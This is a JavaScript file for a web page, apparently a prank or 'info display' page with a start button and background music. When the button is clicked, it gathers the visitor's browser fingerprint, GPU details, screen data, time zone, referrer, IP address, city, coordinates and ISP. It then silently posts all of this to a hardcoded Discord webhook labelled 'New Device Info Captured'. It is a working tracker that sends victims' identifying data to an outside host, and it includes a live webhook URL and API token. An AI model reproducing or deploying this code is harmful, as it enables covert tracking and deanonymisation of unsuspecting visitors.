(function() {
    function getWebGLInfo() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) {
            return { 'GPU': 'Not available' };
        }
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return {
            'GPU Vendor': gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
            'GPU Renderer': gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
        };
    }

    function getDeviceInfo() {
        return {
            'Browser': navigator.userAgent,
            'Platform': navigator.platform,
            'Language': navigator.language,
            'Screen Resolution': `${window.screen.width}x${window.screen.height}`,
            'Available Screen Size': `${window.screen.availWidth}x${window.screen.availHeight}`,
            'Color Depth': `${window.screen.colorDepth}-bit`,
            'Device Memory (Approx)': navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Not available',
            'Time Zone': Intl.DateTimeFormat().resolvedOptions().timeZone,
            'Online Status': navigator.onLine ? "Online" : "Offline",
            'Cookies Enabled': navigator.cookieEnabled,
            'JavaScript Enabled': true,
            'Referrer': document.referrer || 'None'
        };
    }

    function displayDeviceInfo(deviceData) {
        const info = Object.assign(getDeviceInfo(), getWebGLInfo(), deviceData);
        const deviceInfoDiv = document.getElementById('deviceInfo');
        const entries = Object.entries(info);

        entries.forEach(([key, value]) => {
            const infoLine = document.createElement('div');
            infoLine.className = 'info-line';
            infoLine.textContent = `${key}: ${value}`;
            deviceInfoDiv.appendChild(infoLine);
        });

        sendToWebhook(info);
    }

    async function fetchIPInfo() {
        try {
            const response = await fetch('https://ipinfo.io/json?token=284d70a8a57e5a');
            const data = await response.json();
            return {
                'IP Address': data.ip,
                'City': data.city,
                'Region': data.region,
                'Country': data.country,
                'Location (Lat, Lon)': data.loc,
                'ISP': data.org
            };
        } catch (error) {
            return {
                'IP Address': 'Unable to fetch IP',
                'Geolocation': 'Unable to fetch location',
            };
        }
    }

    async function init() {
        const ipData = await fetchIPInfo();
        displayDeviceInfo(ipData);
    }

    document.getElementById('startButton').addEventListener('click', function() {
        document.querySelector('.button-container').style.display = 'none';
        document.getElementById('infoContainer').style.display = 'block';

        init();

        const music = document.getElementById('backgroundMusic');
        music.play();
    });

    function sendToWebhook(info) {
        const webhookURL = 'https://discord.com/api/webhooks/1290148493570084914/ah1FIGY9kehYeRgCO-Jaq0bRQJIm0iXmh-CcnDTUjbQDQElH_EqDL93etcFEwZGPTldQ';
        
        const payload = {
            content: "New Device Info Captured",
            embeds: [{
                title: "Device Information",
                description: Object.entries(info).map(([key, value]) => `**${key}**: ${value}`).join("\n"),
                color: 3447003
            }]
        };

        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        }).then(response => {
            if (response.ok) {
                console.log('sent');
            } else {
                console.error('failed');
            }
        }).catch(error => {
            console.error('Error:', error);
        });
    }
})();
